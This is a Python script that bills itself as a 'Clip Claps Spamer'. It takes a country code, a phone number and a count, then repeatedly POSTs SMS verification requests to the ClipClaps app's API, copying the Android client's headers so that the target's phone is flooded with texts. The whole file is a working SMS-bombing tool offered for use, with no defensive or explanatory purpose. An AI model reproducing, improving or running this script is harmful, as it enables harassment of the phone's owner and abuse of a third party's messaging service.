import json
import requests
import os
import time
import sys

os.system('_')

bar = "\033[1;33;40m\n_________________________________________________\n"
print("""
  \033[1;33m///// ‖ ● ‖‖‖‖ §§§§§  \033[0;36m///// ‖ ‖‖‖‖ ‖‖‖‖ §§§§§
 \033[1;33m//     ‖ ‖ ‖  ‖ §     \033[0;36m//     ‖ ‖  ‖ ‖  ‖ §
 \033[1;33m\\\     ‖ ‖ ‖‖‖‖ §§§§§ \033[0;36m\\\\     ‖ ‖‖‖‖ ‖‖‖‖ §§§§§
  \033[1;33m\\\\\\\\\\ ‖ ‖ ‖        §  \033[0;36m\\\\\\\\\\ ‖ ‖  ‖ ‖        §
                 \033[1;33m§§§§§                    \033[0;36m§§§§§
    \033[0;36m[\033[31m+\033[0;36m]\033[0;32m Clip Claps Spamer \033[0;36m[\033[31m+\033[0;36m]
          \033[0;36m[\033[31m~~TOOL BY  MEGARUN~~\033[0;36m]
                 
""")
print("")
print("")


c = int(input("\033[0;36m[\033[31m+\033[0;36m]\033[1;37m"" ENTER COUNTRY COAD :-  "))
n = int(input("\033[0;36m[\033[31m+\033[0;36m]\033[1;37m"" Enter phone number :-  "))


def main():
    os.system("_")
    print("\n") 
    s = int(input("\033[0;36m[\033[31m+\033[0;36m] \033[1;0;40mEnter Amount :- "))



    url = "https://api.cc.clipclaps.tv/sms/verify"
    

    headers = {
    "Host": "api.cc.clipclaps.tv",
    "charset": "UTF-8",
    "device-type": "2",
    "api-version": "2",
    "external-version": "1.9.0",
    "device": "6.0",
    "version": "40",
    "timezone": "5",
    "token": "",
    "app-id": "ClipClaps_google",
    "cache-control": "no-cache",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "78",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.2.1"

    }    

    params = {
    "remoteIp": "",
    "remotePort": "",
    "sessionId": "",
    
    }    
    payload = {
    "areaCode": c,
    "phone": n,
    "verifyType": "4",
    "token":"",
    "userid":"0"
    }

    w = 0
    while s > w:
        os.system("_")
        
        size = 0
        r = requests.post(url, data=json.dumps(payload), headers=headers)
        resp = str(r)
        dd = r.json()
        ff = dd['date']
        if resp == '<Response [200]>':

            
            
            print("\n",r.text)
            print("\n success")
        elif resp == '<Response [400]>':
            print("400  limited", r.text)
        else:
            print("\033[1;31m ""something wrong please try again")

        w+=1
        print("\033[1;0;40m\n",str(w), end="")
        for i in range(180):
            
            pr = i/180*100
            print("\n\033[0;36m[\033[31m+\033[0;36m]",str(int(pr)) +"% ",end="")
            
            time.sleep(0.002)
            sys.stdout.write("\033[F")


    os.system('')
    again()

def again():
    again = input(' \n Do you wont use again Y or N  - ')
    if again == "y" or again == "Y":
        os.execl(sys.executable, sys.executable, * sys.argv)
    elif again == "n" or again == "N":
        quit()
    else:
        print('\033[1;31;40mEnter valid letter')
        again()
        
        

if __name__ == "__main__":
    main()


